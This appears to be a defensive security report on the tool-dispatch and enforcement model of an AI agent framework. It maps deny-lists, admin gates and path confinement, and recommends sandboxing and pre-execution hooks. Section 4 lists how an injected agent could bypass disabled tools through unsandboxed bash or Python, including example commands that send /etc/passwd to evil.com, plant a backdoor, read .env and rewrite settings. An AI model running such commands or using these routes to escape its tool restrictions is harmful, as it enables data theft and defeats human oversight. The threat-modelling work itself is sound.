# Odysseus Runtime Enforcement Analysis

**Date:** 2026-07-16  
**Upstream Commit:** `c80462e4621c1a3360e5441843bb83b4691a8766`  
**Repository:** https://github.com/odysseus-dev/odysseus  
**License:** AGPL-3.0 (NO source code copied — API surface and architectural patterns only)  
**Researcher:** research-agent  

---

## 1. Tool Dispatch Architecture Summary

### 1.1 Dispatch Flow

The agent loop (`src/agent_loop.py`) receives LLM responses and checks for tool invocations in two forms:

**Fenced-block tools** (legacy / Ollama): The LLM writes triple-backtick code blocks with the tool name as the language tag:
```bash
ls -la /tmp
```

**Native function calling** (OpenAI-compatible): The LLM emits structured function_call objects, converted to ToolBlock instances via `function_call_to_tool_block()`.

The dispatch pipeline in `src/tool_execution.py:_execute_tool_block_impl()` applies these gates in order:

1. **Misformatted call detection** — blocks JSON objects inside `python`/`json`/`xml` fences
2. **Per-request disabled tools** — `disabled_tools` set from the caller
3. **ToolPolicy gate** — `guild_only` mode blocks all tools; custom `ToolPolicy.blocks()` checks
4. **Admin gate** — `_ADMIN_TOOLS` blocked for non-admin owners
5. **Public-user gate** — `NON_ADMIN_BLOCKED_TOOLS` (from `tool_security.py`) blocks most write tools for non-admin users
6. **Background marker** — `#!bg` prefix on bash detaches to background job
7. **MCP routing** — tools in `_MCP_TOOL_MAP` attempt MCP first, fall back to `TOOL_HANDLERS`
8. **Direct handler dispatch** — large elif chain routing to specific handler functions
9. **Dynamic registry fallback** — `dynamic_handlers` from `agent_tools.TOOL_HANDLERS`

### 1.2 Two-Path Tool Architecture

Most tools have **dual-path** execution:
- **MCP path:** Routed through `mcp_manager.call_tool()`, which connects to stdio MCP servers
- **Native/fallback path:** Routed through `_direct_fallback()` → `TOOL_HANDLERS` → specific Python classes

This is the **key architectural insight**: the MCP path is a thin wrapper around native execution. When MCP is unavailable, tools fall through directly to native handlers. There is **no separate MCP-only execution channel**.

### 1.3 MCP Server Landscape

Only 4 are still stdio-based MCP servers:
- `image_gen` — image generation
- `memory` — persistent memory management
- `rag` — retrieval-augmented generation
- `email` — IMAP/SMTP email integration

Plus 1 NPX-based server:
- `builtin_browser` — Playwright browser automation

The former MCP servers for `bash`, `python`, `filesystem`, `web_search`, and `web_fetch` were folded into native in-process execution and are no longer separate MCP processes.

---

## 2. Hook/Plugin/Middleware Availability

### 2.1 ToolPolicy — Per-Turn Policy Composition

The closest thing to a hook system is `ToolPolicy` (`src/tool_policy.py`). This is a **per-turn policy** composed from:
- `disabled_tools` — a set of tool names blocked for this turn
- `hidden_tools` — tools hidden from the prompt
- `block_all_tool_calls` — boolean, set by "guide-only mode"
- `disable_mcp` — boolean, set by guide-only mode

The `ToolPolicy.blocks(tool_name)` method is checked in `_execute_tool_block_impl()` BEFORE any tool execution. However, `ToolPolicy` is a **data structure, not a hook**. It provides boolean gates only — no callbacks, no argument inspection, no result modification.

### 2.2 No Pre-Tool-Execution Hook

There is **no officially supported pre-tool-execution hook** or plugin interface. Specifically:

- **No callback registration** — no `on_before_tool_execute`, `on_after_tool_execute`, or similar
- **No middleware chain** — tools are dispatched through a hardcoded if/elif chain, not a middleware pipeline
- **No plugin system** — no import-based plugin discovery for tool interception
- **No decorator-based interception** — tool handlers are plain async methods, not wrapped in decorators

### 2.3 What Exists Instead

The enforcement model is:
1. **Deny-list at dispatch time** — `disabled_tools` set blocks execution before it starts
2. **Owner-based blocking** — `NON_ADMIN_BLOCKED_TOOLS` blocks most write tools for non-admin users
3. **Plan mode blocking** — `plan_mode_disabled_tools()` computes an allowlist-denylist inversion
4. **Prompt-based guidance** — the system prompt tells the LLM not to use certain tools, but this is **not enforcement**
5. **Path confinement** — `_resolve_tool_path()` confines file reads/writes to allowed roots and blocks sensitive paths

### 2.4 guide_only Mode

`detect_guide_only_turn()` in `tool_policy.py` checks the last user message for patterns like "guide-only mode", "no tools mode", "don't use any tools". When detected, `block_all_tool_calls=True` is set, which blocks ALL tool execution. This is the strongest available enforcement but it is binary — all tools or no tools.

---

## 3. Tool Disable-Ability Assessment

### 3.1 Per-Request Disabling

Every agent call accepts a `disabled_tools: Optional[set]` parameter. This is checked in `_execute_tool_block_impl()` as a set-intersection gate. Tools in `disabled_tools` receive a `BLOCKED` error response.

**How it works**: The `disabled_tools` set is composed upstream (by chat route handlers) from:
- Database-level tool toggles (per-user or global settings)
- Per-chat settings
- The `manage_settings disable_tool/enable_tool` tool
- Plan mode computation
- Owner-level restrictions

### 3.2 Tool Categories and Disable Status

| Category | Tool Names | Config Disable | Admin Required | Workspace Confined | Notes |
|----------|-----------|---------------|----------------|-------------------|-------|
| **Bash/shell** | `bash` | ✅ Yes | ✅ Yes (non-admin) | ❌ No (only cwd) | Runs as `asyncio.create_subprocess_shell` — no sandboxing beyond cwd |
| **Python exec** | `python` | ✅ Yes | ✅ Yes (non-admin) | ❌ No | Runs `python -I -c` in subprocess — full interpreter access |
| **File read** | `read_file` | ✅ Yes | ✅ Yes (non-admin) | ✅ Yes | Path-confined to workspace + allowlist + sensitive path blocking |
| **File write** | `write_file` | ✅ Yes | ✅ Yes (non-admin) | ✅ Yes | Same path confinement as read |
| **File edit** | `edit_file` | ✅ Yes | ✅ Yes (non-admin) | ✅ Yes | String-replacement based editing |
| **Code nav** | `grep`, `glob`, `ls` | ✅ Yes | ✅ Yes (non-admin) | ✅ Yes | Path-confined; skips sensitive dirs |
| **Background jobs** | `manage_bg_jobs` | ✅ Yes | ✅ Yes (non-admin) | N/A | Kills/manages detached bash processes |
| **Documents** | `create_document`, `edit_document`, `update_document`, `suggest_document`, `manage_documents` | ✅ Yes | ❌ No | N/A | In-app editor documents, not filesystem |
| **Email** | 14 email tools (list, read, send, reply, etc.) | ✅ Yes | ✅ Yes (non-admin) | N/A | Routed through `mcp__email__` MCP server |
| **Calendar** | `manage_calendar` | ✅ Yes | ✅ Yes (non-admin) | N/A | CalDAV integration |
| **Memory** | `manage_memory` | ✅ Yes | ✅ Yes (non-admin) | N/A | Persistent facts/preferences store |
| **Skills** | `manage_skills` | ✅ Yes | ✅ Yes (non-admin) | N/A | SKILL.md registry |
| **Tasks** | `manage_tasks` | ✅ Yes | ✅ Yes (non-admin) | N/A | Scheduled background AI jobs |
| **Web search** | `web_search` | ✅ Yes | ❌ No | N/A | Network-capable |
| **Web fetch** | `web_fetch` | ✅ Yes | ❌ No | N/A | Network-capable |
| **Image gen** | `generate_image` | ✅ Yes | ❌ No | N/A | Image generation MCP server |
| **MCP servers** | `manage_mcp` | ✅ Yes | ✅ Yes (admin only) | N/A | Admin-only MCP management |
| **Settings** | `manage_settings` | ✅ Yes | ✅ Yes (non-admin) | N/A | App configuration |
| **API loopback** | `app_api` | ✅ Yes | ✅ Yes (non-admin) | N/A | Internal API calls |
| **Integrations** | `api_call` | ✅ Yes | ✅ Yes (non-admin) | N/A | 3rd-party API integrations |
| **Model serving** | `serve_model`, `download_model`, etc. | ✅ Yes | ✅ Yes (non-admin) | N/A | LLM model server management |
| **Vault** | `vault_search`, `vault_get`, `vault_unlock` | ✅ Yes | ✅ Yes (non-admin) | N/A | Encrypted credential store |
| **Sessions** | `create_session`, `list_sessions`, `manage_session`, `send_to_session` | ✅ Yes | ❌ No | N/A | Chat session management |

### 3.3 MCP Tool Disabling

MCP tools can be disabled per-server via the database (`mcp_server.disabled_tools` JSON field). The `_load_mcp_disabled_map()` function in `agent_loop.py` loads this at the start of each chat request and passes disabled tool names into the `disabled_tools` set.

All `mcp__*` prefixed tools are in `NON_ADMIN_BLOCKED_TOOLS` (`is_public_blocked_tool` returns True for any tool starting with `mcp__`), so non-admin users cannot use any MCP tools at all.

---

## 4. Bypass Path Analysis

### 4.1 Critical Bypasses

**4.1.1 Bash Is Not Sandboxed**

The bash tool runs as an unconfined `asyncio.create_subprocess_shell()`. The cwd is set to the workspace or data directory, but the shell process itself has **no sandboxing** — no seccomp, no cgroups, no filesystem namespace isolation, no network restrictions. The shell inherits the full environment of the Odysseus process.

From the `BashTool.execute()` source:
- Uses `create_subprocess_shell(content, ...)` — runs the command through a shell interpreter
- Environment is `os.environ` (full process environment)
- No resource limits beyond a 1-hour timeout
- The comment in `get_workspace` output is explicit: *"File tools are confined to this folder; the shell starts here but is not sandboxed and can reach outside it."*

**Bypass vector**: Even when `write_file`, `edit_file`, and `read_file` are disabled, bash can perform all file operations directly:
```
echo "content" > /any/path
cat /etc/passwd
curl http://external-service
pip install arbitrary-package
```

**4.1.2 Python Exec Is Not Sandboxed**

The Python tool runs `sys.executable -I -c content` as a subprocess. The `-I` flag runs in isolated mode (ignores user site-packages), but the process has full filesystem and network access. It can:
- Read/write any file the process has permission for
- Make network requests (`import urllib.request`, `import socket`)
- Execute shell commands (`import subprocess`, `import os; os.system(...)`)
- Install packages (`subprocess.run(["pip", "install", ...])`)

**4.1.3 The Prompt Is Not Enforcement**

The system prompt tells the LLM to prefer `write_file`/`edit_file` over bash redirects, not to use bash for web requests, etc. These are purely advisory — the LLM can (and sometimes does) ignore them. There is no server-side check that intercepts bash commands attempting file writes or network calls.

**4.1.4 Native Fallback Bypasses MCP**

The MCP routing in `_call_mcp_tool()` falls back to `_direct_fallback()` when the MCP server is not connected. The error message says *"not connected"* triggers the fallback, meaning:
- If the MCP server for bash fails, bash runs natively
- There is no way to force tool execution to go through MCP exclusively
- The MCP path is a convenience layer, not a security boundary

**4.1.5 Background Jobs Circumvent Tool Lifecycle**

The `#!bg` prefix on bash creates a background job (`bg_jobs.launch()`). This detaches the process from the request lifecycle. A background job:
- Runs to completion even if the chat ends
- Has no tool-level restrictions applied to it
- Can be any arbitrary command
- The output is re-injected into the agent after completion

**4.1.6 Admin Gate Is Binary**

The `_owner_is_admin()` check is either fully blocking or fully permissive. There is no intermediate tier — no "admin-lite" or "restricted admin" role. If you are admin, you can use bash with full system access.

**4.1.7 `app_api` Internal Loopback**

The `app_api` tool can make HTTP calls to Odysseus's own API. If an admin session is active, this provides access to admin routes. Combined with bash's network capability, this is redundant, but `app_api` provides a structured path to internal API access.

### 4.2 Realistic Attack Surface for a Compromised/Prompt-Injected Agent

Given full tool access (admin or single-user mode), a compromised agent turn could:

1. **Write to any file**: `bash -c "echo 'malicious' > ~/.bashrc"` (even if `write_file` is disabled)
2. **Exfiltrate data**: `bash -c "curl https://evil.com/d=$(cat /etc/passwd | base64)"` (even if `web_fetch` is disabled)
3. **Install persistence**: `bash -c "#!bg\npip install backdoor && python -m backdoor"` (backgrounded)
4. **Access credentials**: `bash -c "cat .env"` (`.env` is not in the sensitive files blocklist — only `.ssh`, `.gnupg`, shell rc files, and key files are blocked)
5. **Modify agent config**: `bash -c "echo '{}' > data/settings.json"` (directly write to Odysseus's data directory)
6. **SSH to remote hosts**: `bash -c "ssh user@host 'malicious'"` (if SSH keys exist)

### 4.3 What CANNOT Be Bypassed

- **write_file / read_file sensitive path blocking**: The `_SENSITIVE_BASENAMES` and `_SENSITIVE_FILE_PATTERNS` sets block file operations on `.ssh`, `.gnupg`, `authorized_keys`, `id_rsa`, etc. — but only for the `write_file`/`read_file`/`edit_file` tools. Bash bypasses this entirely.
- **Non-admin block**: Non-admin users are blocked from using bash, python, file tools, email, MCP, and most write tools entirely. This is the strongest enforcement boundary.
- **Workspace confinement**: File tools (`read_file`, `write_file`, `edit_file`, `grep`, `glob`, `ls`) are confined to workspace roots or the allowlist. But bash ignores this.
- **Token limits and timeouts**: Output is capped at `MAX_OUTPUT_CHARS` (10K), subprocesses timeout at 1 hour.

---

## 5. Enforcement Feasibility Assessment

### 5.1 Enforcement Model Classification

| Enforcement Capability | Status | Details |
|----------------------|--------|---------|
| Pre-tool-execution hook | **TOOL_GAP** | No hook/plugin/middleware exists |
| Per-tool disable by config | **NATIVE_HOOK** (partial) | Deny-list via `disabled_tools` set |
| Per-tool disable by owner | **NATIVE_HOOK** | `NON_ADMIN_BLOCKED_TOOLS` hardcoded set |
| Disable bash entirely | **NATIVE_HOOK** | Add `"bash"` to `disabled_tools` |
| Disable python entirely | **NATIVE_HOOK** | Add `"python"` to `disabled_tools` |
| Disable file writes | **NATIVE_HOOK** | Disable `write_file`, `edit_file`, `bash` |
| Force MCP-only writes | **TOOL_GAP** | No way to disable native fallback for individual tools |
| Configure MCP as sole write path | **TOOL_GAP** | Native execution path cannot be removed |
| Intercept tool arguments | **TOOL_GAP** | No argument inspection hook exists |
| Modify tool results | **TOOL_GAP** | No post-execution hook exists |
| Sandbox bash execution | **TOOL_GAP** | Bash runs unconfined; no Docker/nsjail/seccomp |
| Sandbox python execution | **TOOL_GAP** | Python runs unconfined; `-I` flag only blocks site-packages |
| Path-confined shell | **TOOL_GAP** | Shell cwd is confined; process is not |
| Audit all tool calls | **TOOL_GAP** (partial) | `logger.info` logs tool names but not arguments |
| Rate-limit tools | **TOOL_GAP** | No per-tool call counting |

### 5.2 Overall Assessment

**Classification: BROKER_ENFORCED (weak)**

Odysseus has a **deny-list-based enforcement model** with owner-level gating, but:

1. The enforcement boundary is **the same Python process** as the tool execution — there is no process isolation
2. The bash and python tools are **not sandboxed** — disabling them is the only defense
3. If bash is enabled at all, **all other file/write/network restrictions are bypassable**
4. MCP is a **transport convenience**, not a security boundary
5. There is **no hook system** for external enforcement

For the **NATIVE_HOOK** classification to apply, the upstream would need:
- A genuine pre-execution hook (callback, middleware, or plugin)
- Isolation of native tool execution from the hook mechanism

For **BROKER_ENFORCED** to apply, the upstream would need:
- All write-capable tools routed through an external broker
- Native execution paths disabled or user-controllable
- A way to configure the broker as the mandatory write path

---

## 6. Required Upstream Changes for True Enforcement

### 6.1 Minimum Viable Changes (BROKER_ENFORCED)

These changes would enable an external enforcement layer to intercept tool execution:

1. **Add a pre-tool-execution hook callback** in `_execute_tool_block_impl()`:
   - A configurable async callback that receives `(tool_name, parsed_args, owner, session_id)` and returns `(allow: bool, modified_args: dict | None, reason: str)`
   - Called BEFORE any dispatch (MCP, direct, any handler)
   - If `allow=False`, returns a BLOCKED result with the reason

2. **Add a post-tool-execution hook callback**:
   - Receives `(tool_name, args, result, owner, session_id)`
   - Can modify or audit the result before it's fed back to the LLM

3. **Make native fallback configurable per-tool**:
   - Add a setting like `tool_force_mcp` that disables `_direct_fallback()` for specified tools
   - When set, MCP failure returns an error instead of falling through to native execution

4. **Add tool argument logging** (currently only tool name is logged):
   - Store structured tool call records with args and results for audit

### 6.2 Stronger Enforcement Changes (NATIVE_HOOK)

5. **Bash/python sandboxing**:
   - Option to run bash/python in a Docker container or nsjail sandbox
   - Configurable filesystem allowlists for the sandbox
   - Network policy (allow/deny) for the sandbox

6. **Tool execution isolation**:
   - Move tool execution to a subprocess with restricted privileges
   - Make the enforcement layer run in the parent process where it cannot be bypassed

7. **Capability-based access control**:
   - Replace the binary admin/non-admin model with fine-grained capabilities
   - Separate `can_execute_shell`, `can_write_files`, `can_read_files`, `can_access_network`, etc.

### 6.3 MCP-Only Enforcement Changes

8. **First-class MCP enforcement**:
   - Add a `tool_execution_mode` config: `"native"` | `"mcp_only"` | `"hybrid"`
   - In `"mcp_only"` mode, all tools route exclusively through MCP
   - Native `_direct_fallback()` becomes a fatal error, not a fallback

9. **MCP transport security**:
   - Per-MCP-server trust tier configuration
   - Ability to designate specific MCP servers as the ONLY write path
   - Block all native write tools when broker-enabled MCP is configured

---

## 7. What the Gate Kernel Can Do Today

Without ANY upstream changes, an enforcement layer (Gate Kernel) can:

| Capability | Mechanism | Limitation |
|-----------|-----------|------------|
| Block specific tools per request | Pass `disabled_tools` set to agent call | Must be done at call time; LLM may still try to invoke and see error |
| Block ALL tools per request | Set `block_all_tool_calls=True` via ToolPolicy | Binary — can't selectively allow read-only tools |
| Restrict to admin-only | `NON_ADMIN_BLOCKED_TOOLS` in `tool_security.py` blocks most write tools for non-admins | Hardcoded set — can't customize without forking |
| Prompt-level guidance | System prompt tells LLM to prefer file tools over bash | Not enforcement — LLM can ignore |
| Path confinement | `_resolve_tool_path()` blocks file access outside workspace | Bash bypasses this entirely |
| MCP tool disabling | Per-server `disabled_tools` in database | Only affects MCP path; native fallback still works |
| ENV-level MCP disable | `ODYSSEUS_DISABLE_MCP=1` disables all MCP servers | Also disables email, memory, RAG, image gen |

**For the Gate Kernel's requirement of "only broker-based write tools, no native writes":**
- Bash MUST be disabled (add to `disabled_tools`)
- Python MUST be disabled (add to `disabled_tools`)  
- `write_file` and `edit_file` MUST be disabled
- MCP write-enabled tools must be carefully audited
- This reduces the agent to **read-only + MCP-only writes** at the dispatch level
- But the enforcement is at the Python process level, not an OS isolation boundary

---

## 8. Files Analyzed

| File | Purpose |
|------|---------|
| `src/agent_loop.py` | Main agent loop, tool dispatch invocation, prompt composition |
| `src/tool_execution.py` | Tool dispatch (`_execute_tool_block_impl`), MCP routing, native fallback, path confinement |
| `src/agent_tools/__init__.py` | Facade: TOOL_HANDLERS registry, TOOL_TAGS, re-exports |
| `src/tool_policy.py` | `ToolPolicy` data class, `build_effective_tool_policy()`, `detect_guide_only_turn()` |
| `src/tool_security.py` | `NON_ADMIN_BLOCKED_TOOLS`, `PLAN_MODE_READONLY_TOOLS`, `blocked_tools_for_owner()`, `is_public_blocked_tool()` |
| `src/builtin_mcp.py` | Built-in MCP server registration (image_gen, memory, rag, email, browser) |
| `src/tool_schemas.py` | `FUNCTION_TOOL_SCHEMAS` array (OpenAI-compatible tool definitions) |
| `src/tool_utils.py` | MCP manager singleton, `_truncate`, `_parse_tool_args` |
| `src/agent_tools/subprocess_tools.py` | `BashTool`, `PythonTool` — native async subprocess execution |
| `src/agent_tools/filesystem_tools.py` | File read/write/edit, code navigation (grep, glob, ls), path confinement |
| `src/prompt_security.py` | Prompt injection hardening for untrusted context |
| `src/bg_jobs.py` | Background job launch, monitoring, reaping |
| `src/constants.py` | App constants, data paths, output limits |
| `SECURITY.md` | Security policy and deployment guidance |

---

## 9. Recommendation

### For the Gate Kernel enforcement layer:

1. **Disable bash and python at the Odysseus level** (via `disabled_tools` / settings toggles). These are the primary bypass vectors.

2. **Disable `write_file` and `edit_file`** to ensure all filesystem writes go through MCP.

3. **Configure a write-broker MCP server** that becomes the sole write path. The agent can read files via native tools (read-only) but must use the MCP broker for any write operation.

4. **Disable `app_api`** to prevent internal loopback access to admin routes.

5. **Contribute a pre-execution hook to upstream** Odysseus — this is the single most impactful change. A `on_before_tool_execute` callback would allow the Gate Kernel to intercept and validate every tool call.

6. **Monitor the `disabled_tools` composition chain** — ensure that settings changes (via `manage_settings`) cannot re-enable blocked tools.

7. **Treat the enforcement as a best-effort gateway**, not a hard security boundary, until upstream provides process isolation for bash/python execution.

### Risk Summary

| Risk | Severity | Mitigation |
|------|----------|------------|
| Bash bypasses all file/network restrictions | CRITICAL | Disable bash entirely |
| Python can execute arbitrary code including shell commands | CRITICAL | Disable python entirely |
| No pre-execution hook for external validation | HIGH | Contribute upstream; fall back to disabled_tools |
| Native fallback bypasses MCP-only enforcement | HIGH | Disable native write tools; MCP-readiness check |
| Admin gate is binary — no fine-grained capabilities | MEDIUM | Run in single-user mode; external RBAC layer |
| Background jobs inherit full process capabilities | MEDIUM | Disable bash (and thus `#!bg` mechanism) |
| No structured audit log of tool arguments | LOW | Add via pre-execution hook contribution |
| Tool enable/disable can be changed at runtime | LOW | Monitor settings changes; lock critical settings |

---

## 10. Sources

All analysis based on upstream source files at commit `c80462e4621c1a3360e5441843bb83b4691a8766` from https://github.com/odysseus-dev/odysseus:

1. `src/agent_loop.py` — Agent loop, prompt composition, tool dispatch invocation
2. `src/tool_execution.py` — Tool dispatch implementation, MCP routing, path confinement
3. `src/agent_tools/__init__.py` — TOOL_HANDLERS registry, tool tags
4. `src/tool_policy.py` — ToolPolicy composition and guide-only detection
5. `src/tool_security.py` — Block lists, plan mode, owner checks
6. `src/builtin_mcp.py` — Built-in MCP server registration
7. `src/tool_schemas.py` — Function tool schemas
8. `src/tool_utils.py` — MCP manager singleton
9. `src/agent_tools/subprocess_tools.py` — BashTool and PythonTool implementations
10. `src/agent_tools/filesystem_tools.py` — Filesystem tool implementations
11. `src/prompt_security.py` — Prompt injection hardening
12. `src/bg_jobs.py` — Background job lifecycle
13. `src/constants.py` — Application constants
14. `SECURITY.md` — Security deployment guidance
